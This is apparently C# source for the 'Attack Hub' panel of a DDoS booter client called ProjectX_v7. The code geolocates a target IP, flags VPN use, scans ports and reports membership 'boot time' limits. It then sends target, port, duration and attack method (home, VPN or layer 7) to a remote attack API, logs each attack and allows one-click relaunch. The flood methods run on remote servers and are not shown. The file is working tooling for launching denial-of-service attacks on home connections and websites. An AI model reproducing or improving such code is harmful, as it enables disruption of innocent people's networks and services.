﻿using Fusion;
using LiveCharts;
using LiveCharts.Defaults;
using Newtonsoft.Json;
using ProjectX_v7.Includes;
using ProjectX_v7.Includes.FujiPopup;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace ProjectX_v7.User_Controls
{
    public partial class ucAttackHub : UserControl
    {
        public static bool pingActive = false;
        private static Stopwatch stopWatch = new Stopwatch();
        public Func<double, string> Formatter { get; set; }
        private static List<int> pings = new List<int> { 0, 0, 0, 0, 0 };

        private static int openPorts = 0;
        private static int closedPorts = 0;

        public ucAttackHub()
        {
            InitializeComponent();
            b1.IsEnabled = false;
            btn2.IsEnabled = false;
            b2.IsEnabled = false;
            btn3.IsEnabled = false;
            b3.IsEnabled = false;
            btn4.IsEnabled = false;
            b4.IsEnabled = false;
            btn5.IsEnabled = false;

            List<Functions.LocalLogs> localLogs = Functions.ReadFile("AttackLogs", Fusion.App.AppName);
            if (localLogs != null)
            {
                dgAttackLogs.Items.Clear();
                foreach (Functions.LocalLogs Attacks in localLogs)
                {
                    dgAttackLogs.Items.Insert(0, Attacks);
                }
            }
        }

        private async void updateChart()
        {
            await Task.Run(() => this.Dispatcher.Invoke(() =>
            {
                Chart.Values = new ChartValues<ObservableValue>
                {
                    new ObservableValue(pings[0]),
                    new ObservableValue(pings[1]),
                    new ObservableValue(pings[2]),
                    new ObservableValue(pings[3]),
                    new ObservableValue(pings[4])
                };
                Formatter = x => x + " ms";
                lcAxis.LabelFormatter = Formatter;
            }
            ));
        }

        private void Tick(Object stateInfo)
        {
            if (isIP)
            {
                var client = new TcpClient();
                stopWatch.Start();
                if (client.ConnectAsync(this.Dispatcher.Invoke(() => tbTarget.Text), Convert.ToInt32(this.Dispatcher.Invoke(() => tbPort.Text))).Wait(1000))
                {
                    stopWatch.Stop();
                    pings.RemoveAt(0);
                    pings.Add(Convert.ToInt32(stopWatch.ElapsedMilliseconds));
                    this.Dispatcher.Invoke(() => Chart.Stroke = new SolidColorBrush(System.Windows.Media.Color.FromRgb(83, 209, 102)));
                    updateChart();
                    stopWatch.Reset();
                    client.Dispose();
                }
                else
                {
                    stopWatch.Stop();
                    stopWatch.Reset();
                    pings.RemoveAt(0);
                    pings.Add(Convert.ToInt32(0));
                    updateChart();
                    this.Dispatcher.Invoke(() => Chart.Stroke = new SolidColorBrush(System.Windows.Media.Colors.Red));
                    client.Dispose();
                }
            }
        }

        void ping()
        {
            TimerCallback callback = new TimerCallback(Tick);
            Timer timer = new Timer(callback, null, 0, 1000);

            for (; ; )
            {
                Thread.Sleep(1000);
            }
        }

        bool isVPN;
        bool isIP;

        private async void btnTrack_Click(object sender, RoutedEventArgs e)
        {
            if (Functions.ValidateIP(tbTarget.Text))
            {
                // Valid IP
                isIP = true;
                msgHost.successBox("SUCCESS", "This is a valid IP.");

                var geoObj = JsonConvert.DeserializeObject<dynamic>(await Functions.TrackHost(tbTarget.Text));

                lblCoordinates.Content = $"Lat: {geoObj[tbTarget.Text]["latitude"]} / Lon: {geoObj[tbTarget.Text]["longitude"]}";
                lblCountry.Content = geoObj[tbTarget.Text]["country"];
                lblProvider.Content = geoObj[tbTarget.Text]["provider"];
                lblProxy.Content = geoObj[tbTarget.Text]["proxy"];
                lblRisk.Content = geoObj[tbTarget.Text]["risk"];

                if (geoObj[tbTarget.Text]["proxy"] == "yes")
                    isVPN = true;
                else
                    isVPN = false;

                b1.IsEnabled = true;
                btn2.IsEnabled = true;
            }
            else
            {
                if (Functions.ValidateUrl(tbTarget.Text))
                {
                    // Valid URL
                    isIP = false;
                    msgHost.successBox("SUCCESS", "This is a valid URL.");

                    b1.IsEnabled = true;
                    btn2.IsEnabled = true;
                }
                else
                {
                    msgHost.dangerBox("ERROR", "Please enter a valid IP address or URL!");
                }
            }
        }

        private async void tabChange(object sender, RoutedEventArgs e)
        {
            var sentBy = (Button)sender;
            switch (sentBy.Name)
            {
                case "btn1":
                    tabTarget.Visibility = Visibility.Visible;
                    tabPort.Visibility = Visibility.Hidden;
                    tabTime.Visibility = Visibility.Hidden;
                    tabMethod.Visibility = Visibility.Hidden;
                    tabLaunch.Visibility = Visibility.Hidden;
                    break;
                case "btn2":
                    tabTarget.Visibility = Visibility.Hidden;
                    tabPort.Visibility = Visibility.Visible;
                    tabTime.Visibility = Visibility.Hidden;
                    tabMethod.Visibility = Visibility.Hidden;
                    tabLaunch.Visibility = Visibility.Hidden;

                    if (!isIP)
                    {
                        btnScanPorts.IsEnabled = false;
                        tbPort.Text = "443";
                    }
                    else
                    {
                        btnScanPorts.IsEnabled = true;
                        tbPort.Text = "80";
                    }

                    dgOpenPorts.Items.Clear();
                    lblOpenPorts.Content = "N/a";
                    lblClosedPorts.Content = "N/a";
                    lblWaitTime.Content = "N/a";

                    btn3.IsEnabled = true;
                    b3.IsEnabled = true;
                    break;
                case "btn3":
                    tabTarget.Visibility = Visibility.Hidden;
                    tabPort.Visibility = Visibility.Hidden;
                    tabTime.Visibility = Visibility.Visible;
                    tabMethod.Visibility = Visibility.Hidden;
                    tabLaunch.Visibility = Visibility.Hidden;

                    lblConcurrents.Content = Functions.concurrents;
                    lblMaxBootTime.Content = $"{Functions.maxTime}s";
                    lblMembership.Content = Functions.userRank;

                    btn4.IsEnabled = true;
                    b4.IsEnabled = true;
                    break;
                case "btn4":
                    tabTarget.Visibility = Visibility.Hidden;
                    tabPort.Visibility = Visibility.Hidden;
                    tabTime.Visibility = Visibility.Hidden;
                    tabMethod.Visibility = Visibility.Visible;
                    tabLaunch.Visibility = Visibility.Hidden;

                    lblInfo.Content = $"Available methods for ( {tbTarget.Text} )";

                    cbServer.Items.Clear();
                    cbMethod.Items.Clear();
                    if (isIP)
                    {
                        if (isVPN)
                        {
                            await Functions.LoadServers(cbServer, "vpn_server_config");
                            lblType.Content = "VPN";
                        }
                        else
                        {
                            Console.WriteLine(await FusionApp.GetAppVar("home_server_config"));
                            await Functions.LoadServers(cbServer, "home_server_config");
                            lblType.Content = "Home";
                        }
                    }
                    else
                    {
                        await Functions.LoadServers(cbServer, "l7_server_config");
                        lblType.Content = "Domain";
                    }

                    btn5.IsEnabled = true;
                    break;
                case "btn5":
                    tabTarget.Visibility = Visibility.Hidden;
                    tabPort.Visibility = Visibility.Hidden;
                    tabTime.Visibility = Visibility.Hidden;
                    tabMethod.Visibility = Visibility.Hidden;
                    tabLaunch.Visibility = Visibility.Visible;

                    lblTarget.Content = tbTarget.Text;
                    lblPort.Content = tbPort.Text;
                    lblTime.Content = tbTime.Text;
                    lblMethod.Content = cbMethod.Text;
                    lblPingTarget.Content = $"{tbTarget.Text} : {tbPort.Text}";


                    if (isIP)
                    {
                        if (!pingActive)
                        {
                            pingActive = true;
                            lblPingTarget.Content = $"{this.Dispatcher.Invoke(() => tbTarget.Text)} : {this.Dispatcher.Invoke(() => tbPort.Text)}";
                            await Task.Run(() => ping());
                        }
                        else
                        {
                            lblPingTarget.Content = $"{this.Dispatcher.Invoke(() => tbTarget.Text)} : {this.Dispatcher.Invoke(() => tbPort.Text)}";
                        }
                    }
                    else
                    {
                        lblPingTarget.Content = "N/a";
                    }
                    break;
                default:
                    // Error, idfk what so dont ask
                    break;
            }
        }

        private async void btnScanPorts_Click(object sender, RoutedEventArgs e)
        {
            if (string.IsNullOrWhiteSpace(tbPort.Text) || string.IsNullOrWhiteSpace(tbStartPort.Text) || string.IsNullOrWhiteSpace(tbEndPort.Text)) 
            {
                msgHost.dangerBox("Empty Fields!", "Please make sure all fields are filled in.");
                return;
            }
            else if (!int.TryParse(tbPort.Text, out _) || !int.TryParse(tbStartPort.Text, out _) || !int.TryParse(tbEndPort.Text, out _))
            {
                msgHost.dangerBox("Invalid fields!", "Please make sure all fields are intergers.");
                return;
            }

            lblClosedPorts.Content = "N/a";
            lblOpenPorts.Content = "N/a";
            lblWaitTime.Content = "N/a";

            for (int port = Convert.ToInt32(tbStartPort.Text); port < Convert.ToInt32(tbEndPort.Text) + 1; port++)
            {
                await Task.Run(() => { 
                    using (TcpClient client = new TcpClient())
                    {
                        if (client.ConnectAsync(this.Dispatcher.Invoke(() => tbTarget.Text), port).Wait(80))
                        {
                            this.Dispatcher.Invoke(() =>
                            {
                                openPorts += 1;
                                dgOpenPorts.Items.Add(new Ports { Port = port.ToString() });
                                client.Dispose();
                                lblOpenPorts.Content = openPorts;
                                lblWaitTime.Content = "80ms";
                            });
                        }
                        else
                        {
                            this.Dispatcher.Invoke(() =>
                            {
                                closedPorts += 1;
                                client.Dispose();
                                lblClosedPorts.Content = closedPorts;
                                lblWaitTime.Content = "80ms";
                            });
                        }
                    }
                });
            }
        }

        public class Ports 
        { 
            public string Port { get; set; }      
        }

        private async void btnNext_Click(object sender, RoutedEventArgs e)
        {
            tabTarget.Visibility = Visibility.Hidden;
            tabPort.Visibility = Visibility.Hidden;
            tabTime.Visibility = Visibility.Hidden;
            tabMethod.Visibility = Visibility.Visible;
            tabLaunch.Visibility = Visibility.Hidden;

            lblInfo.Content = $"Available methods for ( {tbTarget.Text} )";

            cbServer.Items.Clear();
            cbMethod.Items.Clear();
            if (isIP)
            {
                if (isVPN)
                {
                    await Functions.LoadServers(cbServer, "vpn_server_config");
                    lblType.Content = "VPN";
                }
                else
                {
                    await Functions.LoadServers(cbServer, "home_server_config");
                    lblType.Content = "Home";
                }
            }
            else
            {
                await Functions.LoadServers(cbServer, "l7_server_config");
                lblType.Content = "Domain";
            }

            btn5.IsEnabled = true;
        }

        private async void FetchCorrectMethods(string id) 
        {
            if (isIP)
            {
                if (isVPN)
                    await Functions.FetchServerMethods(cbMethod, id, "vpn_server_config");
                else
                    await Functions.FetchServerMethods(cbMethod, id, "home_server_config");
            }
            else
            {
                await Functions.FetchServerMethods(cbMethod, id, "l7_server_config");
            }
        }

        private void cbServer_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            cbMethod.Items.Clear();
            switch (cbServer.SelectedIndex)
            {
                case 0:
                    FetchCorrectMethods("1");
                    break;
                case 1:
                    FetchCorrectMethods("2");
                    break;
                case 2:
                    FetchCorrectMethods("3");
                    break;
                case 3:
                    FetchCorrectMethods("4");
                    break;
                case 4:
                    FetchCorrectMethods("5");
                    break;
                case 5:
                    FetchCorrectMethods("6");
                    break;
                case 6:
                    FetchCorrectMethods("7");
                    break;
                case 7:
                    FetchCorrectMethods("8");
                    break;
                case 8:
                    FetchCorrectMethods("9");
                    break;
                case 9:
                    FetchCorrectMethods("10");
                    break;
                default:
                    //msgHost.warningBox("Invalid ID", "You cannot load more than 10 servers. Nothing loaded!");
                    break;
            }
        }

        private async void FetchCorrectServerInfo(string id)
        {
            if (isIP)
            {
                if (isVPN)
                    await Functions.FetchServerInfo(id, "vpn_server_config");
                else
                    await Functions.FetchServerInfo(id, "home_server_config");
            }
            else
            {
                await Functions.FetchServerInfo(id, "l7_server_config");
            }
        }

        private async void btnLaunch_Click(object sender, RoutedEventArgs e)
        {
            string target = tbTarget.Text;
            string port = tbPort.Text;
            string time = tbTime.Text;
            string method = cbMethod.Text;
            string id = "";

            if (method == "No home methods here!" || method == "No vpn methods here!" || method == "No layer 7 methods here!")
            {
                msgHost.dangerBox("Invalid Method!", $"'{cbMethod.Text}' is not a method!");
                return;
            }
            if (!int.TryParse(port, out _) || !int.TryParse(time, out _)) 
            {
                msgHost.dangerBox("Invalid Port or Time!", "Port & time must be a integer!");
                return;
            }
            if (string.IsNullOrWhiteSpace(target) || string.IsNullOrWhiteSpace(port) || string.IsNullOrWhiteSpace(time)) 
            {
                msgHost.dangerBox("Empty Fields!", "All fields must be filled in!");
                return;
            }

            msgHost.infoBox("Launching Attack!", $"{target} : {port} : {time}s : {method}");

            switch (cbServer.SelectedIndex) 
            {
                case 0:
                    id = "1";
                    FetchCorrectServerInfo("1");
                    break;
                case 1:
                    id = "2";
                    FetchCorrectServerInfo("2");
                    break;
                case 2:
                    id = "3";
                    FetchCorrectServerInfo("3");
                    break;
                case 3:
                    id = "4";
                    FetchCorrectServerInfo("4");
                    break;
                case 4:
                    id = "5";
                    FetchCorrectServerInfo("5");
                    break;
                case 5:
                    id = "6";
                    FetchCorrectServerInfo("6");
                    break;
                case 6:
                    id = "7";
                    FetchCorrectServerInfo("7");
                    break;
                case 7:
                    id = "8";
                    FetchCorrectServerInfo("8");
                    break;
                case 8:
                    id = "9";
                    FetchCorrectServerInfo("9");
                    break;
                case 9:
                    id = "10";
                    FetchCorrectServerInfo("10");
                    break;
                default:
                    //msgHost.warningBox("Invalid ID", "You cannot load more than 10 servers. Nothing loaded!");
                    break;
            }

            var attackResponse = await FusionApp.ExecuteFullAPI(Functions.serverID, $"&{Functions.hostField}{target}&{Functions.portField}{port}&{Functions.timeField}{time}&{Functions.methodField}{method}", Convert.ToInt32(time));
            if (attackResponse.Error == false)
            {
                // Logs & Refresh's log list
                if (Functions.WriteToFile(new Functions.LocalLogs() { AdvHL_Host = target, AdvHL_Port = port, AdvHL_Time = time, AdvHL_Method = method, AdvHL_Server = Functions.serverID, AdvHL_ID = id }, "AttackLogs", Fusion.App.AppName)) { }
                List<Functions.LocalLogs> localLogs = Functions.ReadFile("AttackLogs", Fusion.App.AppName);
                if (localLogs != null) 
                {
                    dgAttackLogs.Items.Clear();
                    foreach (Functions.LocalLogs Attacks in localLogs) 
                    {
                        dgAttackLogs.Items.Insert(0, Attacks);
                    }
                }

                // Count Attack
                int userAttacks = Convert.ToInt32(await FusionApp.GetUserVar("attacks"));
                int sum = userAttacks + 1;
                await FusionApp.SetUserVar("attacks", sum.ToString());

                msgHost.successBox("Attack Sent", attackResponse.Message);
            }
            else 
            {
                msgHost.dangerBox("Failed to send attack!", attackResponse.Message);
            }
        }

        private async void btnAttack_Click(object sender, RoutedEventArgs e)
        {
            var target = (dgAttackLogs.SelectedCells[0].Column.GetCellContent(dgAttackLogs.SelectedCells[0].Item) as TextBlock).Text;
            var port = (dgAttackLogs.SelectedCells[1].Column.GetCellContent(dgAttackLogs.SelectedCells[1].Item) as TextBlock).Text;
            var time = (dgAttackLogs.SelectedCells[2].Column.GetCellContent(dgAttackLogs.SelectedCells[2].Item) as TextBlock).Text;
            var method = (dgAttackLogs.SelectedCells[3].Column.GetCellContent(dgAttackLogs.SelectedCells[3].Item) as TextBlock).Text;
            var server = (dgAttackLogs.SelectedCells[4].Column.GetCellContent(dgAttackLogs.SelectedCells[4].Item) as TextBlock).Text;
            var id = (dgAttackLogs.SelectedCells[5].Column.GetCellContent(dgAttackLogs.SelectedCells[5].Item) as TextBlock).Text;
            FetchCorrectServerInfo(id);
            msgHost.infoBox("Launching Attack!", $"{target} : {port} : {time}s : {method}");

            var attackResponse = await FusionApp.ExecuteFullAPI(server, $"&{Functions.hostField}{target}&{Functions.portField}{port}&{Functions.timeField}{time}&{Functions.methodField}{method}", Convert.ToInt32(time));
            if (attackResponse.Error == false)
            {
                // Logs & Refresh's log list
                if (Functions.WriteToFile(new Functions.LocalLogs() { AdvHL_Host = target, AdvHL_Port = port, AdvHL_Time = time, AdvHL_Method = method, AdvHL_Server = Functions.serverID, AdvHL_ID = id }, "AttackLogs", Fusion.App.AppName)) { }
                List<Functions.LocalLogs> localLogs = Functions.ReadFile("AttackLogs", Fusion.App.AppName);
                if (localLogs != null)
                {
                    dgAttackLogs.Items.Clear();
                    foreach (Functions.LocalLogs Attacks in localLogs)
                    {
                        dgAttackLogs.Items.Insert(0, Attacks);
                    }
                }

                // Count Attack
                int userAttacks = Convert.ToInt32(await FusionApp.GetUserVar("attacks"));
                int sum = userAttacks + 1;
                await FusionApp.SetUserVar("attacks", sum.ToString());

                msgHost.successBox("Attack Sent", attackResponse.Message);
            }
            else 
            {
                msgHost.dangerBox("Failed to send attack!", attackResponse.Message);
            }
        }
    }
}
